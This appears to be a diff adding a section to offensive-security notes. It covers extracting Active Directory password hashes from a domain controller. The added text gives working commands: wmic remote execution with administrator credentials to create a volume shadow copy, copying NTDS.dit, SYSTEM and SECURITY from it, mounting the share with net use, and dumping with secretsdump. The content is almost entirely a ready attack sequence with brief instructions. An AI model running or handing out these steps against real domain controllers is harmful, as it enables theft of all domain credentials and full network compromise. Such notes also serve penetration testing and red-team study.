@@ -143,3 +143,20 @@ After obtaining the hashes can be dumped using secretsdump from impacket.
 ```
 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 ```
+***
+
+#### Domain controller hashes shadow copy over WMI
+
+Creat a shadow copy of the C drive.
+```powershell
+wmic /node:dc01 /user:administrator@offense /password:123456 process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
+```
+Copy the ntds.dit, SYSTEM and SECURITY hives to C:\temp on the remote machine
+```powershell
+wmic /node:dc01 /user:administrator@offense /password:123456 process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY c:\temp\"
+```
+Mount the remote C:\temp directoy to your local machine
+```
+net use j: \\dc01\c$\temp /user:administrator 123456; dir j:\
+```
+Now you can run secretsdump to dump the hashes (as shown in previous examples)
